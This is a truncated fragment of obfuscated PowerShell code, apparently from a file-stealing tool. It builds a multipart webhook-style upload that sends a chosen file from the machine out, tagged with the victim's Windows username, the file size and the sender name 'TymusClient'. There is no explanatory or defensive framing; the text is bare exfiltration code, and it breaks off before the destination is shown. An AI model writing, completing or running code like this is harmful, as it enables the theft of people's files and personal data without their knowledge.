...
if(Test-Path $q6){try{$q7=Split-Path $q6 -Leaf;$q8=(Get-Item $q6).Length;$q9="----M$([DateTime]::Now.Ticks.ToString('x'))";$q10=[System.IO.MemoryStream]::new();$q11=[System.IO.StreamWriter]::new($q10);$q11.Write("--$q9`r`nContent-Disposition: form-data; name=`"payload_json`"`r`nContent-Type: application/json`r`n`r`n{`"content`":`"**$env:USERNAME** - $q7 ($q8 B)`",`"username`":`"TymusClient`"}`r`n--$q9`r`nContent-Disposition: form-data; name=`"files[0]`"; filename=`"$q7`"`r`nContent-Type: application/oct
